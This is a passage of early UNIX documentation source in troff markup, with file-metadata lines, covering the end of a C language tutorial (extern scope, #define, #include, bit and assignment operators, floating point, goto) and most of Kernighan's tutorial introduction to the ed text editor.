		for( j=0; (r=keyword[i][j]) \*= str[j] && r != '\\0'; j\*+ );
		if( r \*= str[j] )
			return(i);
	}
	return(-1);
}
.E2
.PP
Sorry _
neither local variables nor structures can be initialized.
-- /usr/doc/ctut/ct7 mode=0110664 uid=3 gid=3 atime=170478286 mtime=173059636 --
.NH 
Scope Rules: Who Knows About What
.PP
A complete C program need not be compiled all at once;
the source text of the program may be kept in several files,
and previously compiled routines may be loaded from libraries.
How do we arrange that data gets passed from one
routine to another?
We have already seen how to use function arguments and values,
so let us talk about external data.
Warning: the words
.ul
declaration
and
.ul
definition
are used precisely in this section;
don't treat them as the same thing.
.PP
A major shortcut exists for making 
.UL extern
declarations.
If the definition of a variable appears
.ul
before
its use in some function,
no
.UL extern
declaration is needed within the function.
Thus, if a file contains
.E1
f1( ) { \*.\*.\*. }
.SP
int foo;
.SP
f2( ) { \*.\*.\*. foo = 1; \*.\*.\*. }
.SP
f3( ) { \*.\*.\*. if ( foo ) \*.\*.\*. }
.E2
no declaration of
.UL foo
is needed in either
.UL f2
or or
.UL f3,
because the external definition of
.UL foo
appears before them.
But if
.UL f1
wants to use
.UL foo,
it has to contain the declaration
.E1
f1( ) {
	extern int foo;
	\*.\*.\*.
}
.E2
.PP
This is true also of any function that exists
on another file _
if it wants
.UL foo
it has to use an
.UL extern
declaration
for it.
(If somewhere there is an
.UL extern
declaration for something,
there must also eventually be an external definition of it,
or you'll get an ``undefined symbol'' message.)
.PP
There are some hidden pitfalls in external declarations
and definitions if you use multiple source files.
To avoid them, 
first,
define and initialize each external variable only once in the entire set of files:
.E1
int	foo	0;
.E2
You can get away with multiple external definitions on 
.UC UNIX,
but not on
.UC GCOS,
so don't ask for trouble.
Multiple initializations are illegal everywhere.
Second,
at the beginning of any file that contains functions needing a variable
whose definition is in some other file,
put in an
.UL extern
declaration,
outside of any function:
.E1
extern	int	foo;
.SP
f1( ) { \*.\*.\*. }
   etc\*.
.E2
.PP
The 
.UL #include
compiler control line,
to be discussed shortly,
lets you make a single copy of the external declarations
for a program and then stick them into each of the source files
making up the program.
.NH
#define, #include
.PP
C provides a very limited macro facility.
You can say
.E1
#define	name		something
.E2
and thereafter anywhere ``name'' appears as a token,
``something'' will be substituted.
This is particularly useful in parametering the sizes of arrays:
.E1
#define	ARRAYSIZE	100
	int	arr[ARRAYSIZE];
	 \*.\*.\*.
	while( i\*+ < ARRAYSIZE )\*.\*.\*.
.E2
(now we can alter the entire program by changing only the
.UL define)
or in setting up mysterious constants:
.E1
#define	SET		01
#define	INTERRUPT	02	/\** interrupt bit \**/
#define	ENABLED	04
 \*.\*.\*.
if( x & (SET | INTERRUPT | ENABLED) ) \*.\*.\*.
.E2
Now we have meaningful words instead of mysterious constants.
(The mysterious operators `&' (AND)
and `\(or' (OR)
will be covered in the next section.)
It's an excellent practice to write programs
without any literal constants except in
.UL #define
statements.
.PP
There are several warnings about
.UL #define\*.
First, there's no semicolon at the end of a
.UL #define;
all the text from the name to the end of the line
(except for comments)
is taken to be the ``something''.
When it's put into the text, blanks are placed around it.
Good style typically makes the name in the 
.UL #define
upper case _
this makes parameters more visible.
Definitions affect things only after they occur,
and only within the file in which they occur.
Defines can't be nested.
Last, if there is a
.UL #define
in a file,
then the first character of the file 
.ul
must
be a `#',
to signal the preprocessor that definitions exist.
.WS
.PP
The other control word known to C is
.UL #include\*.
To include one file in your source at compilation time, say
.E1
#include "filename"
.E2
This is useful for putting a lot of heavily used data definitions and 
.UL #define
statements at the beginning of a file to be compiled.
As with 
.UL #define,
the first line of a file containing a
.UL #include
has to begin with a `#'.
And
.UL #include
can't be nested _
an included file can't contain another
.UL #include\*.
-- /usr/doc/ctut/ct8 mode=0110664 uid=3 gid=3 atime=170478287 mtime=173059636 --
.NH
Bit Operators
.PP
C has several operators for logical bit-operations.
For example,
.E1
x = x & 0177;
.E2
forms the bit-wise 
.UC AND
of
.UL x
and 0177,
effectively retaining only the last seven bits of 
.UL x\*.
Other operators are
.E1
.ft R
\(or	inclusive OR
^	(circumflex) exclusive OR
.tr+~
+	(tilde) 1's complement
.tr++
!	logical NOT
<<	left shift (as in x<<2)
>>	right shift	(arithmetic on PDP\(hy11; logical on H6070, IBM360)
.E2
.NH
Assignment Operators
.PP
An unusual feature of C
is that the normal binary operators like
`+', `\(mi', etc.
can be combined with the assignment operator `='
to form new assignment operators.
For example,
.E1
x =- 10;
.E2
uses the assignment operator `=\(mi' to decrement 
.UL x
by 10,
and
.E1
x =& 0177
.E2
forms the
.UC AND
of 
.UL x
and 0177.
This convention is a useful notational shortcut,
particularly if
.UL x
is a complicated expression.
The classic example is summing an array:
.E1
for( sum=i=0; i<n; i\*+ )
	sum =+ array[i];
.E2
But the spaces around the operator are critical!
For instance,
.E1
x = -10;
.E2
sets
.UL x
to
\(mi10, while
.E1
x =- 10;
.E2
subtracts 10 from
.UL x\*.
When no space is present,
.E1
x=-10;
.E2
also decreases 
.UL x
by 10.
This is quite contrary to the experience of most programmers.
In particular, watch out for things like
.E1
c=\**s\*+;
y=&x[0];
.E2
both of which are almost certainly not what you wanted.
Newer versions of various compilers are courteous enough to warn you about the ambiguity.
.PP
Because all other operators in an expression are evaluated
before the assignment operator,
the order of evaluation should be watched carefully:
.E1
x = x<<y | z;
.E2
means
``shift
.UL x
left
.UL y
places,
then
.UC OR
with
.UL z,
and store in
.UL x\*.''
But
.E1
x =<< y | z;
.E2
means
``shift
.UL x
left by
.UL y|z
places'',
which is rather different.
.NH
Floating Point
.PP
We've skipped over floating point so far,
and the treatment here will be hasty.
C has single and double precision numbers
(where the precision depends on the machine at hand).
For example,
.E1
	double sum;
	float avg, y[10];
	sum = 0\*.0;
	for( i=0; i<n; i\*+ )
		sum =+ y[i];
	avg = sum/n;
.E2
forms the sum and average of the array
.UL y\*.
.PP
All floating arithmetic is done in double precision.
Mixed mode arithmetic is legal;
if an arithmetic operator in an expression
has both operands
.UL int
or
.UL char,
the arithmetic done is integer, but
if one operand is
.UL int
or
.UL char
and the other is
.UL float
or
.UL double,
both operands are converted to
.UL double\*.
Thus if
.UL i
and
.UL j
are
.UL int
and
.UL x
is
.UL float,
.E1
(x+i)/j		converts i and j to float
x + i/j		does i/j integer, then converts
.E2
Type conversion
may be made by assignment;
for instance,
.E1
	int m, n;
	float x, y;
	m = x;
	y = n;
.E2
converts
.UL x
to integer
(truncating toward zero),
and
.UL n
to floating point.
.PP
Floating constants are just like those in Fortran or PL/I,
except that the exponent letter is `e' instead of `E'.
Thus:
.E1
	pi = 3\*.14159;
	large = 1\*.23456789e10;
.E2
.PP
.UL printf
will format floating point numbers:
.UL ``%w\*.df''
in the format string will print the corresponding variable
in a field
.UL w
digits wide, with
.UL d
decimal places.
An
.UL e
instead of an
.UL f
will produce exponential notation.
.NH
Horrors! goto's and labels
.PP
C has 
a
.UL goto
statement and labels, so you can branch about
the way you used to.
But most of the time
.UL goto's
aren't needed.
(How many have we used up to this point?)
The code can almost always be more clearly expressed by
.UL for/while,
.UL if/else,
and compound statements.
.PP
One use of
.UL goto's
with some legitimacy is in a program
which
contains a long loop,
where a
.UL while(1)
would be too extended.
Then you might write
.E1
   mainloop:
	\*.\*.\*.
	goto mainloop;
.E2
Another use is to implement a
.UL break
out of more than one level of
.UL for
or 
.UL while\*.
.UL goto's
can only branch to labels within the same function.
.NH
Acknowledgements
.PP
I am indebted to a veritable host of readers who made
valuable criticisms on several drafts of this tutorial.
They ranged in experience from complete beginners
through several implementors of C compilers
to the C language designer himself.
Needless to say, this is a wide enough spectrum of opinion
that no one is satisfied (including me);
comments and suggestions are still welcome,
so that some future version might be improved.
-- /usr/doc/ctut/ct9 mode=0100664 uid=3 gid=3 atime=170478287 mtime=173059636 --
.sp 3
.sp 3
.SH
.ft G
References
.PP
C is an extension of B, which was designed by D. M. Ritchie and K. L. Thompson [4].
The C language design and
.UC UNIX
implementation
are the work of D. M. Ritchie.
The
.UC GCOS
version was begun by A. Snyder and B. A. Barres,
and completed by
S. C. Johnson and M. E. Lesk.
The 
.UC IBM
version
is primarily due to T. G. Peterson,
with the assistance of M. E. Lesk.
.IP [1]
D. M. Ritchie,
.ul
C Reference Manual.
Bell Labs,
Jan. 1974.
.IP [2]
M. E. Lesk & B. A. Barres,
.ul
The GCOS C Library.
Bell Labs,
Jan. 1974.
.IP [3]
D. M. Ritchie & K. Thompson,
.ul
UNIX Programmer's Manual.
5th Edition,
Bell Labs, 1974.
.IP [4]
S. C. Johnson & B. W. Kernighan,
.ul
The Programming Language B.
Computer Science Technical Report 8,
Bell Labs, 1972.
-- /usr/doc/ed mode=0140775 uid=3 gid=3 atime=173059641 mtime=173059507 --
-- /usr/doc/ed/e0 mode=0100664 uid=3 gid=3 atime=170478292 mtime=173059641 --
.ds . \fB.\fP
.tr~
.ds . \fB.\fR
.		S1 - smaller in text
.de S1
.nh
.ps -1
..
.		S2 - reverse S1
.de S2
.ps +1
.hy
..
.de WS
.sp \\$1
..
.		H1 - start new section
.de H1
.SH
..
.		H2 - after H1 title
.de H2
..
.		X1 - start of example
.de X1
.nf
.in +.3i
.sp 4p
.if t .tr -\(en
..
.		X2 - end of example
.de X2
.sp 4p
.tr --
.in -.3i
.fi
..
.de PG
.PP
..
-- /usr/doc/ed/e1 mode=0110664 uid=3 gid=3 atime=170478292 mtime=173059641 --
.TL
A Tutorial Introduction to the \s-2UNIX\s+2 Text Editor
.sp
.AU
B. W. Kernighan
.sp
.AI
Bell Laboratories, Murray Hill, N. J.
.nr PS 9
.nr VS 11
.if t .2C
.H1
Introduction
.H2
.PG
.ul
Ed
is a ``text editor'', that is, an interactive program
for creating and modifying ``text'',
using directions provided by a user at
a terminal.
The text is often a document
like this one,
or a program
or perhaps data for a program.
.PG
This introduction is meant to simplify learning
.ul
ed.
The recommended way to learn
.ul
ed
is to read this document,
simultaneously using
.ul
ed
to follow the examples,
then to read the description in section I of the
.S1
UNIX
.S2
manual, all the while
experimenting with
.ul
ed.
(Solicitation of advice from experienced users is also useful.)
.PG
Do the exercises!
They cover material not completely discussed
in the actual text.
An appendix summarizes the commands.
.H1
Disclaimer
.H2
.PG
This is an introduction and a tutorial.
For this reason, no attempt is made to
cover more than a part of the facilities that
.ul
ed
offers
(although this fraction includes the most useful and frequently used
parts).
Also,
there is not enough space to explain basic
.S1
UNIX
.S2
procedures.
We will assume that you know how to log on to
.S1
UNIX,
.S2
and that you have at least a vague understanding
of what a file is.
.PG
You must also know what character to type as the end-of-line
on your particular terminal.
This is a ``newline'' on Model 37 Teletypes,
and ``return'' on most others.
Throughout, we will refer to this character,
whatever it is,
as ``newline''.
.H1
Getting Started
.H2
.PG
We'll assume that you have logged in to
.S1
UNIX
.S2
and it has just said ``%''.
The
easiest way to get
.ul
ed
is to type
.X1
ed	(followed by a newline)
.X2
You are now ready to go \(mi
.ul
ed
is waiting for you to tell it what to do.
.H1
Creating Text \(mi the Append command ``a''
.H2
.PG
As our first problem, suppose we want to create some text
starting from scratch.
Perhaps we are typing the very first
draft of a paper; clearly it will have to start
somewhere, and undergo modifications later.
This section will show how to get some text in, just to
get started.
Later we'll talk about how to change it.
.PG
When
.ul
ed
is first started, it is rather like working
with a blank piece of paper \(mi there is no text
or information present.
This must be supplied by the person using
.ul
ed;
it is usually done
by typing in the text, or by reading it into
.ul
ed
from a
file.
We will start by typing in some text, and return shortly to how to
read files.
.PG
First a bit of terminology.
In
.ul
ed
jargon, the text being
worked on is said to be ``kept in a buffer.''
Think of the
buffer as a work space, if you like, or simply as the information
that you are going to be editing.
In effect the buffer is like the
piece of paper, on which we will write things, then change some
of them, and finally file the whole thing away for another day.
.PG
The user tells
.ul
ed
what to do to his text
by typing instructions called ``commands.''
Most
commands consist of a single letter,
which must be typed in lower case.
Each command is typed
on a separate line.
(Sometimes the command is preceded by information
about what line or lines of text are to be affected \(mi
we will discuss these shortly.)
.ul
Ed
makes no response
to most commands \(mi there is no prompting
or typing of messages like ``ready''.
(This silence is preferred
by experienced users, but sometimes a hangup for beginners.)
.PG
The first command is
.ul
append,
written as the letter
.X1
a
.X2
all
by itself.
It means ``append (or add) text lines to the buffer,
as I type them in.''
Appending is rather like
writing fresh material on a piece of paper.
.PG
So to enter lines of text into the buffer,
we just type an ``a'' followed by a
newline, followed by the lines of text we want, like this:
.X1
a
Now is the time
for all good men
to come to the aid of their party.
.li
\fB.\fR
.X2
.PG
The only way to stop appending is to type a
line that contains only a period.
The ``\*.'' is used
to tell
.ul
ed
that we have finished appending.
(Even experienced users forget that terminating ``\*.''
sometimes.
If
.ul
ed
seems to be ignoring you,
type an extra line with just ``\*.'' on it.
You may then find you've added some garbage lines
to your text, which you'll have to take out later.)
.PG
After the append command has been done, the buffer will
contain the three lines
.X1
Now is the time
for all good men
to come to the aid of their party.
.X2
The ``a'' and ``\*.'' aren't there, because they are
not text.
.PG
To add more text to what we already have,
just issue another ``a'' command, and continue typing.
.H1
Error Messages \(mi ``?''
.H2
.PG
If at any time you make an error in the commands you type to
.ul
ed,
it will tell you by typing
.X1
?
.X2
This is about as cryptic as it can be,
but with practice, you can usually
figure out how you goofed.
-- /usr/doc/ed/e2 mode=0110664 uid=3 gid=3 atime=170478293 mtime=173059641 --
.H1
Writing text out as a file \(mi the Write command ``w''
.H2
.PG
It's likely that we'll want to save our text for later use.
To write out the contents of the buffer onto a file,
we use the
.ul
write
command
.X1
w
.X2
followed by the filename we want to write on.
This will copy the buffer's contents
onto the specified file
(destroying any previous information on the file).
To save
the text on a file named ``junk'', for example, type
.X1
w junk
.X2
Leave a space between ``w'' and the file name.
.ul
Ed
will respond by printing
the number of characters it wrote out.
In our case,
.ul
ed
would respond with
.X1
68
.X2
(Remember that blanks and the newline character at the end of each
line are included in the character count.)
Writing a file just makes a copy of the text \(mi the
buffer's contents are not disturbed, so we can go on adding
lines to it.
This is an important point.
.ul
Ed
at all times works on a copy
of a file, not the file itself.
No change in the contents
of a file takes place until you give a ``w'' command.
(Writing out the text onto a file from time to time as it is being
created is a good idea, since if the system crashes or if you make some horrible mistake, you will lose
all the text in the buffer but any text that was written onto
a file is relatively safe.)
.H1
Leaving ed \(mi the Quit command ``q''
.H2
.PG
To terminate a session with
.ul
ed,
save the text you're working on
by writing it onto a file using the ``w'' command,
and then type the command
.X1
q
.X2
which
stands for
.ul
quit.
The system will respond with ``%''.
At
this point your buffer vanishes, with all its text,
which is why you want to write it out before quitting.
.H1
Exercise 1:
.H2
.PG
Enter
.ul
ed
and
create some text using
.X1
a
.li
. . . text . . .
.li
\fB.\fR
.X2
Write it out using ``w''.
Then leave
.ul
ed
with the ``q'' command, and print the file,
to see that everything worked.
(To print a file, say
.X1
pr filename
.X2
or
.X1
cat filename
.X2
in response to ``%''.
Try both.)
.H1
Reading text from a file \(mi the Edit command ``e''
.H2
.PG
A common way to get text into the buffer is to read it
from a file in the file system.
This is what you do to edit text
that you saved with the 
``w''
command in a previous session.
The
.ul
edit
command ``e''
fetches the entire contents of a file into the buffer.
So if we had saved the three lines
``Now is the time'', etc.,
with a ``w'' command in an earlier session,
the 
.ul
ed
command
.X1
e junk
.X2
would fetch the entire contents of the file ``junk''
into the buffer, and respond
.X1
68
.X2
which is the number of characters in ``junk''.
.ul
If anything was already in the buffer, it is deleted first.
.PG
If we use the ``e'' command to read a file into the buffer,
then we need not use a file name after a subsequent ``w'' command;
.ul
ed
remembers the last file name used in an ``e'' command,
and ``w'' will write on this file.
Thus a common way to operate is
.X1
ed
e file
[editing session]
w
q
.X2
.PG
You can find out at any time what file name
.ul
ed
is remembering by typing the 
.ul
file
command ``f''.
In our case,
if we typed
.X1
f
.X2
.ul
ed
would reply
.X1
junk
.X2
.H1
Reading text from a file \(mi the Read command ``r''
.H2
.PG
Sometimes we want to read a file into the buffer
without destroying anything that is already there.
This is done by the
.ul
read
command ``r''.
The command
.X1
r junk
.X2
will read the file ``junk'' into the buffer;
it adds it
to the end of whatever is already in the buffer.
So if we do a read after
an edit:
.X1
e junk
r junk
.X2
the buffer will contain
.ul
two
copies of the text (six lines).
.X1
Now is the time
for all good men
to come to the aid of their party.
Now is the time
for all good men
to come to the aid of their party.
.X2
Like the ``w'' and ``e'' commands, ``r'' prints the
number of characters read in, after the reading operation is complete.
.PG
Generally speaking, ``r'' is much less used than ``e''.
.H1
Exercise 2:
.H2
.PG
Experiment with the ``e'' command \(mi
try reading and printing various files.
You may get an error ``?'',
typically because you spelled the file name wrong.
Try alternately reading and appending to see that they work
similarly.
Verify that
.X1
ed filename
.X2
is exactly equivalent to
.X1
ed
e filename
.X2
What does
.X1
f filename
.X2
do?
.H1
Printing the contents of the buffer \(mi the Print command ``p''
.H2
.PG
To
.ul
print
or list the contents of the buffer (or parts
of it) on the terminal, we use the print command
.X1
p
.X2
The way this is done is as follows.
We specify the lines where
we want printing to begin and where we want it to end,
separated by a comma, and
followed by the letter ``p''.
Thus to print the first two lines of the buffer, for
example, (that is, lines 1 through 2) we say
.X1
1,2p	(starting line=1, ending line=2 p)
.X2
.ul
Ed
will respond with
.X1
Now is the time
for all good men
.X2
.PG
Suppose we want to print
.ul
all
the lines in the buffer.
We could use ``1,3p'' as above if we knew there were exactly
3 lines in the buffer.
But in general, we don't
know how many there are, so what do we use for the ending
line number?
.ul
Ed
provides a shorthand symbol for ``line number of
last line in buffer'' \(mi the dollar sign ``$''.
Use it this
way:
.X1
1,$p
.X2
This will print
.ul
all
the lines in the buffer (line 1 to last line.)
If you want to stop the printing before it is finished,
push the DEL or Delete key;
.ul
ed
will type
.X1
?
.X2
and wait for the next command.
.PG
To print the
.ul
last
line of the buffer, we could use
.X1
$,$p
.X2
but
.ul
ed
lets us abbreviate this to
.X1
$p
.X2
We can print any single line by typing the line
number followed by a ``p''.
Thus
.X1
1p
.X2
produces the response
.X1
Now is the time
.X2
which is the first line of the buffer.
.PG
In fact,
.ul
ed
lets us abbreviate even further:
we can print any single line by typing
.ul
just
the line number \(mi no need to type the letter ``p''.
So if we say
.X1
$
.X2
.ul
ed
will print the last line of the buffer for us.
.PG
We can also use ``$'' in combinations like
.X1
$\(mi1,$p
.X2
which prints the last two lines of the buffer.
This helps when we want to see how far we got in typing.
.H1
Exercise 3:
.H2
.PG
.H2
As before, create some text using the append command and
experiment with the ``p'' command.
You will find, for example,
that you can't print line 0 or a line beyond
the end of the buffer, and that attempts
to print a buffer in reverse order by saying
.X1
3,1p
.X2
don't work.
-- /usr/doc/ed/e3 mode=0110664 uid=3 gid=3 atime=170478294 mtime=173059641 --
.H1
The current line \(mi ``Dot'' or ``.''
.H2
.PG
Suppose our buffer still contains the six lines as above,
that we have just typed
.X1
1,3p
.X2
and
.ul
ed
has printed the three lines for us.
Try typing just
.X1
p	(no line numbers).
.X2
This will print
.X1
to come to the aid of their party.
.X2
which is the third line of the buffer.
In fact it is the last
(most recent) line that we have done anything with.
(We just printed it!)
We can
repeat this ``p'' command without line numbers, and
it will continue to print line 3.
.PG
The reason is that
.ul
ed
maintains a record of the last line
that we did anything to (in this case, line 3, which we
just printed) so that it can be used instead of an explicit
line number.
This most recent line is referred to by the
shorthand symbol
.X1
.li
\fB.\fR	(pronounced ``dot'').
.X2
Dot is a line number in the same way that ``$'' is; it means
exactly ``the current line'', or loosely,
``the line we most recently did something to.''
We
can use it in several ways \(mi one possibility
is to say
.X1
.li
\fB.\fR,$p
.X2
This will print all the lines from (including) the current
line to the
end of the buffer.
In our case these are lines 3 through 6.
.PG
Some commands change the value of dot, while others do not.
The print command sets dot to the number of the last line printed;
by our last command, we would have ``\*.'' = ``$'' = 6.
.PG
Dot is most useful when used in combinations like this one:
.X1
.li
\fB.\fR+1	(or equivalently, \*.+1p)
.X2
This means ``print the next line'' and gives us a handy way to step
slowly through a buffer.
We can also say
.X1
.li
\fB.\fR\(mi1	(or \*.\(mi1p )
.X2
which means ``print the line
.ul
before
the current line.''
This enables us to go backwards if we wish.
Another useful one is something like
.X1
.li
\fB.\fR\(mi3,\*.\(mi1p
.X2
which prints the previous three lines.
.PG
Don't forget that all of these change the value of dot.
You can find out what dot is at any time by typing
.X1
.li
\fB.\fR=
.X2
.ul
Ed
will respond by printing the value of dot.
.PG
Let's summarize some things about the ``p'' command
and dot.
Essentially ``p'' can be preceded by 0, 1, or 2 line numbers.
If there is no line number given, it prints the ``current line'',
the line that dot refers to.
If there is one line number given
(with or without the letter ``p''),
it prints that line (and dot is set there); and if there
are two line numbers, it prints all the lines in that range
(and sets dot to the last line printed.)
If two line numbers are specified
the first can't be bigger than the second (see Exercise 2.)
.PG
Typing a single newline will cause printing of the next line \(mi
it's
equivalent to ``\*.+1p''.
Try it.
Try typing ``^'' \(mi it's equivalent to
``\*.\(mi1p''.
.H1
Deleting lines: the ``d'' command
.H2
.PG
Suppose we want to get rid of the three extra lines in the buffer.
This is done by the
.ul
delete
command
.X1
d
.X2
Except that ``d'' deletes lines instead of printing them,
its action is similar to that of ``p''.
The lines to be deleted are specified for ``d''
exactly as they are for ``p'':
.X1
\fIstarting line, ending line\fP d
.X2
Thus the command
.X1
4,$d
.X2
deletes lines 4 through the end.
There are now three lines left, as we can check by using
.X1
1,$p
.X2
And notice that ``$'' now is line 3!
Dot
is set to the next line after the last line deleted,
unless the last line deleted is the last line in the buffer.
In that case, dot is set to ``$''.
.H1
Exercise 4:
.H2
.PG
Experiment with ``a'', ``e'', ``r'', ``w'', ``p'', and ``d''
until you are sure that you
know what they do, and until you understand how dot, ``$'', and
line numbers are used.
.PG
If you are adventurous, try using line numbers with ``a'', ``r'', and
``w'' as well.
You will find that ``a'' will append lines
.ul
after
the line number that you specify (rather than after dot); that ``r'' reads
a file in
.ul
after
the line number you specify (not necessarily
at the end of the buffer); and that ``w'' will write out exactly the lines
you specify, not necessarily the whole buffer.
These variations are sometimes handy.
For instance you can insert a file at the beginning of a buffer
by saying
.X1
0r filename
.X2
and you can enter lines at the beginning of the buffer
by saying
.X1
0a
.li
. . . \fItext\fP . . .
.li
\fB.\fR
.X2
Notice that
``\*.w'' is
.ul
very
different from
.X1
.li
\fB.\fR
w
.X2
.H1
Modifying text: the Substitute command ``s''
.H2
.PG
We are now ready to try one of the most important
of all commands \(mi the substitute command
.X1
s
.X2
This is the command
that is used to change individual
words or letters within a line or group of lines.
It is what we use, for example, for correcting spelling
mistakes and typing errors.
.PG
Suppose that by a typing error, line 1 says
.X1
Now is th time
.X2
\(mi the ``e'' has been left off ``the''.
We can use ``s'' to fix this up as follows:
.X1
1s/th/the/
.X2
This says: ``in line 1, substitute for the characters `th'
the characters `the'.''
To verify
that it works (\fIed\fR will not print
the result automatically) we say
.X1
p
.X2
and get
.X1
Now is the time
.X2
which is what we wanted.
Notice that dot must have been set to the line
where the substitution took place, since the ``p'' command
printed that line.
Dot is always set this way with the ``s'' command.
.PG
The general way to use the substitute command is
.X1
\fIstarting-line, ending-line\fP s/\fIchange this\fP/\fIto this\fP/
.X2
Whatever string of characters is between the first pair of
slashes is replaced by whatever is between the second pair,
in
.ul
all
the lines between starting line and ending line.
Only the first occurrence on each line is changed, however.
If you want to change
.ul
every
occurrence, see Exercise 5.
The rules for line numbers are the same as those for ``p'',
except that dot is set to the last line changed.
(But there is a trap for the unwary: if no substitution
took place, dot is
.ul
not
changed.
This causes an error ``?'' as a warning.)
.PG
Thus we can say
.X1
1,$s/speling/spelling/
.X2
and correct the first spelling mistake
on each line
in the text.
(This is useful for people who are consistent
misspellers!)
.PG
If no line numbers are given, the ``s'' command assumes we mean
``make the substitution on line dot'', so it changes things only
on the current line.
This leads to the very common sequence
.X1
s/something/something else/p
.X2
which makes some correction on the
current line, and then prints it, to make sure it
worked out right.
If it didn't,
we can try again.
(Notice that we put
a print command on the same line as the substitute.
With few exceptions, ``p'' can follow any command;
no other multi-command lines are legal.)
.PG
It's also legal to say
.X1
s/ . . . //
.X2
which means ``change the first
string of characters to
\fInothing\fR'',
i.e.,
remove them.
This is useful for deleting extra words in a line or removing extra
letters from words.
For instance, if we had
.X1
Nowxx is the time
.X2
we can say
.X1
s/xx//p
.X2
to get
.X1
Now is the time
.X2
Notice that ``//'' here means ``no characters'', not a blank.
There
.ul
is
a difference!
(See below for another meaning of ``//''.)
-- /usr/doc/ed/e4 mode=0110664 uid=3 gid=3 atime=170478295 mtime=173059641 --
.H1
Exercise 5:
.H2
.PG
Experiment with the substitute command.
See what happens if you
substitute for some word on a line with several occurrences of that word.
For example, do this:
.X1
a
the other side of the coin
.li
\fB.\fR
s/the/on the/p
.X2
You will get
.X1
on the other side of the coin
.X2
A substitute command changes only the first occurrence of the first string.
You can change all occurrences by adding a ``g'' (for ``global'')
to the ``s'' command, like this:
.X1
s/ . . . / . . . /gp
.X2
Try other characters instead of slashes to delimit the two sets
of characters in the ``s'' command \(mi anything should work
except blanks or tabs.
.PG
(If you get funny results using any of the characters
.X1
^    \*.    $    [    *    \\
.X2
read the section on ``Special Characters''.)
.H1
Context searching \(mi ``/ . . . /''
.H2
.PG
With the substitute command mastered, we can move on to
another highly important idea of
.ul
ed
\(mi context searching.
.PG
Suppose we have our original three line text in the buffer:
.X1
Now is the time
for all good men
to come to the aid of their party.
.X2
Suppose we want to find the line that contains ``their'' so
we can change it to ``the''.
Now with only three lines in the buffer, it's pretty easy
to keep track of what line the word ``their'' is on.
But if the buffer contained several hundred lines,
and we'd been making changes, deleting and rearranging lines,
and so on, we would no longer really know what this line
number would be.
Context searching is simply a method of specifying the desired line,
regardless of what its number is,
by specifying some context on it.
.PG
The way we say ``search for a line
that contains this particular string of characters''
is to type
.X1
/\fIstring of characters we want to find\fP/
.X2
For example,
the
.ul
ed
line
.X1
/their/
.X2
is a context search which
is sufficient to find the desired line \(mi
it will locate the next occurrence of
the characters between slashes (``their'').
It also sets dot to that line
and prints the line for verification:
.X1
to come to the aid of their party.
.X2
``Next occurrence'' means that
.ul
ed
starts looking for the string at line ``\*.+1'',
searches to the end of the buffer,
then continues at line 1 and searches to line dot.
(That is, the search ``wraps around'' from ``$'' to 1.) 
It scans all the lines in the buffer until it either finds the desired line
or gets back to dot again.
If the given string of characters can't be found in any line,
.ul
ed
types the error message
.X1
?
.X2
Otherwise it prints the line it found.
.PG
We can do both the search for the desired line
.ul
and
a
substitution all at once, like this:
.X1
/their/s/their/the/p
.X2
which will yield
.X1
to come to the aid of the party.
.X2
There were three parts to that last command:
context search for the desired line, make the substitution, print the line.
.PG
The expression ``/their/'' is a context search expression.
In their simplest form,
all context search expressions are like this \(mi
a string of characters surrounded by slashes.
Context searches are interchangeable with line numbers,
so they can be used by themselves to find and print a desired line,
or as line numbers for some other command, like ``s''.
We used them both ways in the examples above.
.PG
Suppose the buffer contains the three familiar lines
.X1
Now is the time
for all good men
to come to the aid of their party.
.X2
Then the
.ul
ed
line numbers
.X1
/Now/+1
/good/
/party/\(mi1
.X2
are all context search expressions, and they all refer
to the same line (line 2).
To make a change in line 2,
we could say
.X1
/Now/+1s/good/bad/
.X2
or
.X1
/good/s/good/bad/
.X2
or
.X1
/party/\(mi1s/good/bad/
.X2
The choice is dictated only by convenience.
We could print all three lines by, for instance
.X1
/Now/,/party/p
.X2
or
.X1
/Now/,/Now/+2p
.X2
or by any number of similar combinations.
The first one of these might be better if we don't
know how many lines are involved.
(Of course, if there were only three lines in the buffer,
we'd use
.X1
1,$p
.X2
but not if there were several hundred.)
.PG
The basic rule is: a context search expression is
.ul
the same as
a line number, so it can be used wherever a line number is needed.
.H1
Exercise 6:
.H2
.PG
Experiment with context searching.
Try a body of text with
several occurrences
of the same string of characters, and scan through it using
the same context search.
.PG
Try using context searches as line numbers for the
substitute, print and delete commands.
(They can also be used
with ``r'', ``w'', and ``a''.)
.PG
Try context searching using ``?text?'' instead of ``/text/''.
This scans lines in the buffer in reverse order
rather than normal.
This is
sometimes useful if you go too far while looking for some
string of characters \(mi it's an easy way to back up.
.PG
(If you get funny results with any of the characters
.X1
^    \*.    $    [    *    \\
.X2
read the section on ``Special Characters''.)
.PG
.ul
Ed
provides a shorthand for repeating a context search
for the same string.
For example,
the
.ul
ed
line number
.X1
/string/
.X2
will find the next occurrence of ``string''.
It often happens that this is not the desired line,
so the search must be repeated.
This can be done by typing merely
.X1
//
.X2
This shorthand stands for ``the most recently used
context search expression.''
It can
also be used as the first string of the substitute
command, as in
.X1
/string1/s//string2/
.X2
which will find the next occurrence of ``string1''
and replace it by ``string2''.
This can save a lot of typing.
Similarly
.X1
??
.X2
means ``scan backwards for the same expression.''
-- /usr/doc/ed/e5 mode=0110664 uid=3 gid=3 atime=170478295 mtime=173059641 --
.H1
Change and Insert \(mi ``c'' and ``i''
.H2
.PG
This section discusses the
.ul
change
command
.X1
c
.X2
which is used to change
or replace a group of one or more lines,
and the
.ul
insert
command
.X1
i
.X2
which is used for inserting a group of one or more lines.
.PG
``Change'', written as
.X1
c
.X2
is used to replace a number of lines with different lines, which
are typed in at the terminal.
For example,
to change lines ``\*.+1'' through ``$'' to something else, type
.X1
 .+1,$c
 . . . \fItype the lines of text you want here\fP . . .
 \fB.\fR
.X2
The lines you type between the ``c'' command and
the ``\*.'' will take the place of the original lines between
start line and end line.
This is most useful in replacing a line
or several lines which have errors in them.
.PG
If only one line is specified in the ``c'' command, then just
that line is replaced.
(You can type in as many replacement lines as you like.)
Notice
the use of ``\*.'' to end the
input \(mi this works just like the ``\*.'' in the append command
and must appear by itself on a new line.
If no line number is given, line dot is replaced.
The value of dot is set to the last line you typed in.
.PG
``Insert'' is similar to append \(mi for instance
.X1
/string/i
.li
. . . \fItype the lines to be inserted here\fP . . .
.li
\fB.\fR
.X2
will insert the given text
.ul
before
the next line that contains ``string''.
The text between ``i'' and ``\*.'' is
.ul
inserted before
the specified line.
If no line number is specified dot is used.
Dot is set to the last line inserted.
.H1
Exercise 7:
.H2
.PG
